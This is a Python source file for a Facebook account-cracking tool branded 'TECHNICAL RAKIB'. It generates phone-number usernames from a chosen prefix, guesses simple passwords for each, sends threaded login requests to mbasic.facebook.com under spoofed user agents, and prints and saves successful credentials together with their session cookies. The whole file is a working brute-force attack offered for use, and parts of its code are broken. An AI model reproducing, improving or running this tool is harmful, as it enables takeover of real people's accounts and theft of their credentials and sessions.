import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/MD.RAKIB.0FFICIAL5880')
logo=("""
 \033[1;32m───────────────────────────────────────────────── 
 \033[1;32m _______  _______  _       _________ ______  
 \033[1;32m(  ____ )(  ___  )| \    /\\__   __/(  ___ \ 
 \033[1;32m| (    )|| (   ) ||  \  / /   ) (   | (   ) )
 \033[1;32m| (____)|| (___) ||  (_/ /    | |   | (__/ / 
 \033[1;32m|     __)|  ___  ||   _ (     | |   |  __ (  
 \033[1;32m| (\ (   | (   ) ||  ( \ \    | |   | (  \ \ 
 \033[1;32m| ) \ \__| )   ( ||  /  \ \___) (___| )___) )
 \033[1;32m|/   \__/|/     \||_/    \/\_______/|/ \___/ 
                                             

─────────────────────────────────────────────────
[+] OWNER    : TECHNICAL RAKIB 
[+] Facebook : Md Rakib Mondol 
[+] Github   : markrakib
[+] Version  : 0.1
[+] Tool     : Free
─────────────────────────────────────────────────
""")



A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def mueor():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/1018818162394748/')
    print(logo)
    print('[+] EXAMPLE CODE : 016 017 018 019')
    nude = input('\033[1;32m[\033[1;32m+\033[1;32m] CHOOSE CODE  : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as MUEOR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+nude)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('[+] Working Data / Wi-fi')
        print('\033[1;32m──────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'iloveallah']
            MUEOR.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m──────────────────────────────────────────────────')
    print('\033[1;37m)[+] Crack Successfully Complete')
    print('\033[1;32m──────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sRAKIB-143\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
                'authority': 'mbasic.facebook.com',
    'method':'GET',
    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=1o0DZiGQb5KAqy9iPTbrT7Z6; sb=140DZlsS4H71sL8xpXxbfpFq; m_pixel_ratio=1.875; wd=384x774; fr=0pBWTUjSRYMJPspej..BmA43X..AAA.0.0.BmA43m.AWW74pnXK5I',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A037F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 269.0.0.13.76 (iPhone14,5; iOS 16_1_2; nl_NL; nl-NL; scale=3.00; 1170x2532; 443842272)'
'Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]'
'Mozilla/5.0 (Linux; Android 13; Pixel 4a Build/TQ1A.221205.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]'
'Mozilla/5.0 (Linux; arm_64; Android 12; RMX3630) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.4.88.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; CPH2005 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022113898'
'Mozilla/5.0 (Linux; Android 11; HD1910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; CPH2069 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]'
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN/A505FNXXS9CUF1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm; Android 11; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.5.77.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 9; ZB633KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaApp_Android/22.116.1 YaSearchBrowser/22.116.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 10; HRY-LX1T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaSearchBrowser/23.13.1 BroPP/1.0 YaSearchApp/23.13.1 webOmni SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1 RDDocuments/8.3.5.911'
'Mozilla/5.0 (Linux; arm; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.160 YaBrowser/22.5.5.93.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SM-P615 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]'
'Mozilla/5.0 (Linux; Android 10; moto e(6i) Build/QOHS30.280-19-19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
'TuneIn Radio/24.3.0; iPhone14%2C7; iOS/16.1.1'
'Lightning%20DS/2022122701 CFNetwork/1240.0.4 Darwin/20.6.0'
'Mozilla/5.0 (Linux; Android 10; 5007W) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 12; RMX3085) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.4.84.00 SA/3 Mobile Safari/537.36'
'Dalvik/2.1.0 (Linux; U; Android 11; iPlus P1 Build/RP1A.201005.001)'
'Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; 7.1.1; ZIDOO_Z9S) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Mi 9 SE Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022116172'
'Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 Instagram 268.0.0.18.72 Android (29/10; 480dpi; 1080x2110; HUAWEI/HONOR; YAL-L21; HWYAL; kirin980; ru_RU; 442822269)'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 267.0.0.8.92 (iPhone13,2; iOS 16_1; ru_RU; ru-RU; scale=3.00; 1170x2532; 439751848) NW/3'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 267.0.0.8.92 (iPhone10,4; iOS 16_1; ru_RU; ru-RU; scale=2.00; 750x1334; 439751848)'
'Mozilla/5.0 (Linux; Android 9; SM-A105M Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]'
'Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/341.0.0.7.68;]'
'Mozilla/5.0 (Linux; Android 9; VirtualBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
'Mozilla/5.0 (Linux; Android 13; SM-G988B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[RAKIB-143-OK💚] {uid} • {ps}" '  \n\033[1;33m [💝🥱]\033[1;33mCookie = '+coki+ ' ')
                open('/sdcard/RAKIB-143-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            # elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RAKIB-143-CP💔] {uid} • {ps}")
                open('/sdcard/RAKIB-143-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

mueor()